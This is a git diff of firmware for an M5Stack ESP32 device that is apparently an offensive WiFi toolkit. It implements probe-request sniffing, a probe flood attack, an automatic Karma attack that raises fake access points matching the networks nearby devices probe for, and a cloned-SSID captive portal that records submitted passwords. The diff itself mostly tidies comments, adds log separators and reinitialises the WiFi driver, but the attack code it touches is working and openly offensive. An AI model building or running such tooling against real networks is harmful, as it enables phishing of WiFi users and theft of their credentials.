@@ -123,6 +123,7 @@ AppState currentStateKarma = StartScanKarma;
 
 bool isProbeSniffingMode = false;
 bool isProbeKarmaAttackMode = false;
+bool isKarmaMode = false;
 
 // Probe Sniffing end
 
@@ -152,6 +153,7 @@ std::set<std::string> seenWhitelistedSSIDs;
 //led part 
 
 #define PIN 15
+//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
 #define NUMPIXELS 10
 
 Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
@@ -244,8 +246,8 @@ void setup() {
     "  Escaping the Matrix...",
     " You know I-Am-Jakoby ?",
     "You know TalkingSasquach?",
-    "            42           ",
-    "    Don't be a skidz !",
+    "           42           ",
+    "    Don't be a Skidz !",
     "  Hack,Eat,Sleep,Repeat",
     "   You know Samxplogs ?",
     " For educational purpose",
@@ -295,7 +297,7 @@ void setup() {
     "    Shaking champagne…",
     "Warping with Rick & Morty.",
     "       Pickle Rick !!!",
-    "Navigating the Multiverse.",
+    "Navigating the Multiverse",
     "   Szechuan Sauce Quest.",
     "   Morty's Mind Blowers.",
     "   Ricksy Business Afoot.",
@@ -309,7 +311,7 @@ void setup() {
     "   Towelie's High Times.",
     "Butters Awkward Escapades.",
     "Navigating the Multiverse.",
-    "Affirmative Dave,\n I read you.",
+    "  Affirmative Dave,\n    I read you.",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -487,6 +489,7 @@ void firstScanWifiNetworks() {
     unsigned long previousMillis = 0;
     const long interval = 1000; 
 
+
 void loop() {
   M5.update();
   handleDnsRequestSerial();
@@ -507,6 +510,7 @@ void loop() {
 
       case ScanningKarma:
         if (M5.BtnB.wasPressed()) {
+          isKarmaMode = true;
           stopScanKarma();
           currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
         }
@@ -682,7 +686,7 @@ void selectProbeSerial(int index) {
     file.close();
 
     if (selectedProbe.length() > 0) {
-        clonedSSID = selectedProbe;  // Utilisez cette variable pour les opérations ultérieures
+        clonedSSID = selectedProbe; 
         Serial.println("Probe selected: " + selectedProbe);
     } else {
         Serial.println("Probe index not found.");
@@ -742,9 +746,13 @@ void checkSerialCommands() {
     } else if (command == "stop_probe_attack") {
         if (isProbeAttackRunning) {
             isProbeAttackRunning = false;
+            Serial.println("-------------------");
             Serial.println("Stopping probe attack...");
+            Serial.println("-------------------");
         } else {
+            Serial.println("-------------------");
             Serial.println("No probe attack running.");
+            Serial.println("-------------------");
         }
     } else if (command == "probe_sniffing") {
           isOperationInProgress = true;
@@ -752,9 +760,11 @@ void checkSerialCommands() {
           probeSniffing(); 
           delay(200);
     }  else if (command == "stop_probe_sniffing") {
-        stopProbeSniffingViaSerial = true; // Indique que l'arrêt vient du port série
+        stopProbeSniffingViaSerial = true; 
         isProbeSniffingRunning = false;
+        Serial.println("-------------------");
         Serial.println("Stopping probe sniffing via serial...");
+        Serial.println("-------------------");
     }else if (command == "list_probes") {
         listProbesSerial();
     } else if (command.startsWith("select_probes ")) {
@@ -766,25 +776,29 @@ void checkSerialCommands() {
           startAutoKarma();
           delay(200);
     }  else if (command == "help") {
+          Serial.println("-------------------");
           Serial.println("Available Commands:");
-          Serial.println("scan_wifi - Scan for WiFi networks");
-          Serial.println("select_network <index> - Select a network by index for operations");
-          Serial.println("detail_ssid <index> - Show details of a specific WiFi network");
-          Serial.println("clone_ssid - Clone the selected network SSID for captive portal");
-          Serial.println("start_portal - Start the captive portal");
-          Serial.println("stop_portal - Stop the captive portal");
-          Serial.println("list_portal - List available portal files");
-          Serial.println("change_portal <index> - Change the current portal to another");
-          Serial.println("check_credentials - Check for saved credentials");
-          Serial.println("probe_attack - Start a probe request attack");
-          Serial.println("stop_probe_attack - Stop the probe request attack");
-          Serial.println("probe_sniffing - Start sniffing for probe requests");
-          Serial.println("stop_probe_sniffing - Stop sniffing for probe requests");
-          Serial.println("list_probes - List captured probe requests");
-          Serial.println("select_probes <index> - Select captured probe request by index");
-          Serial.println("karma_auto - Start an automatic karma attack that stop automaticaly when successfull");
+          Serial.println("scan_wifi - Scan WiFi Networks");
+          Serial.println("select_network <index> - Select WiFi <index>");
+          Serial.println("detail_ssid <index> - Details of WiFi <index>");
+          Serial.println("clone_ssid - Clone Network SSID");
+          Serial.println("start_portal - Activate Captive Portal");
+          Serial.println("stop_portal - Deactivate Portal");
+          Serial.println("list_portal - Show Portal List");
+          Serial.println("change_portal <index> - Switch Portal <index>");
+          Serial.println("check_credentials - Check Saved Credentials");
+          Serial.println("probe_attack - Initiate Probe Attack");
+          Serial.println("stop_probe_attack - End Probe Attack");
+          Serial.println("probe_sniffing - Begin Probe Sniffing");
+          Serial.println("stop_probe_sniffing - End Probe Sniffing");
+          Serial.println("list_probes - Show Probes");
+          Serial.println("select_probes <index> - Choose Probe <index>");
+          Serial.println("karma_auto - Auto Karma Attack Mode");
+          Serial.println("-------------------");
     } else {
+      Serial.println("-------------------");
       Serial.println("Command not recognized: " + command);
+      Serial.println("-------------------");
     }
   }
 }
@@ -1544,16 +1558,14 @@ void listPortalFiles() {
         if (!file.isDirectory()) {
             String fileName = file.name();
             if (fileName.endsWith(".html")) {
-                // Ajouter le chemin complet du fichier au tableau portalFiles
                 portalFiles[numPortalFiles] = String("/sites/") + fileName;
 
-                // Afficher le nom du fichier avec un index sur le port série
                 Serial.print(numPortalFiles);
                 Serial.print(": ");
                 Serial.println(fileName);
 
                 numPortalFiles++;
-                if (numPortalFiles >= 30) break; // Limite à 30 fichiers
+                if (numPortalFiles >= 30) break; // max 30 files
             }
         }
         file.close();
@@ -1834,7 +1846,6 @@ void displayMonitorPage1() {
   M5.Display.setTextSize(2);
   M5.Display.setTextColor(TFT_WHITE);
   
-  // Affichage des informations statiques
   M5.Display.setCursor(10, 90);
   M5.Display.println("SSID: " + clonedSSID);
   M5.Display.setCursor(10, 120);
@@ -1842,7 +1853,6 @@ void displayMonitorPage1() {
   M5.Display.setCursor(10, 150);
   M5.Display.println("Page: " + selectedPortalFile.substring(7));
 
-  // Réinitialiser les valeurs pour forcer la mise à jour
   oldNumClients = -1;
   oldNumPasswords = -1;
 
@@ -1853,7 +1863,6 @@ void displayMonitorPage1() {
       handleDnsRequestSerial();
       server.handleClient();
 
-      // Rafraîchir l'affichage des clients et mots de passe
       int newNumClients = WiFi.softAPgetStationNum();
       int newNumPasswords = countPasswordsInFile();
 
@@ -2072,17 +2081,17 @@ void displayMonitorPage3() {
 
 void probeSniffing() {
     isProbeSniffingMode = true;
-    isProbeSniffingRunning = true; // S'assurer que le sniffing est activé
+    isProbeSniffingRunning = true; 
     startScanKarma();
 
-    while (isProbeSniffingRunning) { // Utiliser la variable pour contrôler la boucle
+    while (isProbeSniffingRunning) { 
         M5.update();
         handleDnsRequestSerial();
 
-        // Vérifier si l'arrêt provient de l'interface utilisateur
         if (M5.BtnB.wasPressed()) {
-            stopProbeSniffingViaSerial = false; // Assurez-vous que l'arrêt n'est pas traité comme série
-            isProbeSniffingRunning = false; // Arrêter le sniffing
+            stopProbeSniffingViaSerial = false;
+            isProbeSniffingRunning = false;
+            break;
         }
     }
 
@@ -2218,7 +2227,6 @@ void restoreConfigParameter(String key) {
     if (key == "brightness") {
       M5.Display.setBrightness(defaultBrightness);
     }
-    // other value
   }
 }
 
@@ -2248,7 +2256,7 @@ void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
             if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
                 return;
             }
-        // Vérifier si le SSID est déjà dans la liste des SSID vus
+
         bool ssidExistsKarma = false;
         for (int i = 0; i < ssid_count_Karma; i++) {
             if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
@@ -2257,17 +2265,15 @@ void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
             }
         }
 
-        // Si le SSID est dans la whitelist mais pas encore dans la liste des SSID vus
+
         if (isSSIDWhitelisted(ssidKarma)) {
             if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
-                // Si le SSID n'a pas été vu auparavant dans ce scan
-                seenWhitelistedSSIDs.insert(ssidKarma); // Ajoutez-le à l'ensemble
+                seenWhitelistedSSIDs.insert(ssidKarma); 
                 Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
             }
-            return; // Ignorez les SSID de la whitelist
+            return; 
         }
 
-        // Traiter les SSID non-whitelisted normalement
         if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
             strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
             updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
@@ -2379,16 +2385,24 @@ void startScanKarma() {
   M5.Display.clear();
   drawStopButtonKarma();
   esp_wifi_set_promiscuous(false);
-  delay(50);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  delay(300); //petite pause
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_start();
   esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);
+
   readConfigFile("/config/config.txt");
   seenWhitelistedSSIDs.clear();
-  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);
+
   Serial.println("-------------------");
   Serial.println("Probe Sniffing Started...");
   Serial.println("-------------------");
-
 }
+
 
 void stopScanKarma() {
     Serial.println("-------------------");
@@ -2397,7 +2411,7 @@ void stopScanKarma() {
     isScanningKarma = false;
     esp_wifi_set_promiscuous(false);
 
-    // Si le sniffing est en mode série (commande via série), sauvegarder automatiquement sans demander de confirmation
+
     if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
         Serial.println("Saving SSIDs to SD card automatically...");
         for (int i = 0; i < ssid_count_Karma; i++) {
@@ -2405,9 +2419,11 @@ void stopScanKarma() {
         }
         Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
     } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
-        // Sinon, demander une confirmation pour la sauvegarde
         bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
         if (saveSSID) {
+            M5.Display.clear();
+            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
+            M5.Display.println("Saving SSIDs on SD..");
             for (int i = 0; i < ssid_count_Karma; i++) {
                 saveSSIDToFile(ssidsKarma[i]);
             }
@@ -2417,18 +2433,22 @@ void stopScanKarma() {
             Serial.println("-------------------");
             Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
             Serial.println("-------------------");
+        } else {
+            M5.Display.clear();
+            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
+            M5.Display.println("  No SSID saved.");
         }
-    }
-
-    // Réinitialisation des paramètres
+        delay(1000);
     memset(ssidsKarma, 0, sizeof(ssidsKarma));
     ssid_count_Karma = 0;
+    }
+    
+
     menuSizeKarma = ssid_count_Karma;
     currentIndexKarma = 0;
     menuStartIndexKarma = 0;
-
-    // Réinitialiser l'interface utilisateur
-    if (ssid_count_Karma > 0) {
+    
+    if (isKarmaMode && ssid_count_Karma > 0) {
         drawMenuKarma();
         currentStateKarma = StopScanKarma;
     } else {
@@ -2436,9 +2456,9 @@ void stopScanKarma() {
         inMenu = true;
         drawMenu();
     }
-
+    isKarmaMode = false;
     isProbeSniffingMode = false;
-    stopProbeSniffingViaSerial = false; // Réinitialiser le flag pour les commandes séries
+    stopProbeSniffingViaSerial = false;
 }
 
 
@@ -2963,7 +2983,7 @@ std::vector<String> readCustomProbes(const char* filename) {
                 probesStr = probesStr.substring(idx + 1);
             }
             if (probesStr.length() > 0) {
-                customProbes.push_back(probesStr); // Ajouter le dernier élément
+                customProbes.push_back(probesStr);
             }
             break;
         }
@@ -3027,9 +3047,9 @@ void probeAttack() {
             setNextWiFiChannel();
             String ssid;
             if (!customProbes.empty()) {
-                ssid = customProbes[probeCount % customProbes.size()]; // Utiliser un probe personnalisé
+                ssid = customProbes[probeCount % customProbes.size()];
             } else {
-                ssid = generateRandomSSID(32); // Utiliser un SSID aléatoire
+                ssid = generateRandomSSID(32);
             }
             if (ledOn){
                 pixels.setPixelColor(0, pixels.Color(255,0,0)); 
@@ -3090,10 +3110,19 @@ void setNextWiFiChannel() {
 }
 
 void restoreOriginalWiFiSettings() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  delay(300); // Petite pause pour s'assurer que tout est terminé
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_start();
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
   restoreOriginalMAC();
   WiFi.mode(WIFI_STA);
 }
+
 
 // probe attack end
 
@@ -3103,7 +3132,13 @@ bool isAPDeploying = false;
 
 void startAutoKarma() {
   esp_wifi_set_promiscuous(false);
-  delay(50);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  delay(300); // Petite pause pour s'assurer que tout est terminé
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
 
@@ -3111,11 +3146,13 @@ void startAutoKarma() {
   Serial.println("-------------------");
   Serial.println("Karma Auto Attack Started....");
   Serial.println("-------------------");
+
   readConfigFile("/config/config.txt");
   createCaptivePortal();
   loopAutoKarma();
   esp_wifi_set_promiscuous(false);
 }
+
 
 void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type != WIFI_PKT_MGMT || isAPDeploying) return;
@@ -3143,7 +3180,7 @@ void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 
 bool readConfigFile(const char* filename) {
-    whitelist.clear(); // Efface la liste existante
+    whitelist.clear();
     File configFile = SD.open(filename);
     if (!configFile) {
         Serial.println("Failed to open config file");
@@ -3155,7 +3192,7 @@ bool readConfigFile(const char* filename) {
         if (line.startsWith("KarmaAutoWhitelist=")) {
             int startIndex = line.indexOf('=') + 1;
             String ssidList = line.substring(startIndex);
-            if (!ssidList.length()) { // Liste vide
+            if (!ssidList.length()) {
                 break;
             }
             int lastIndex = 0, nextIndex;
@@ -3163,7 +3200,7 @@ bool readConfigFile(const char* filename) {
                 whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
                 lastIndex = nextIndex + 1;
             }
-            whitelist.push_back(ssidList.substring(lastIndex).c_str()); // Ajoute le dernier élément
+            whitelist.push_back(ssidList.substring(lastIndex).c_str()); 
         }
     }
     configFile.close();
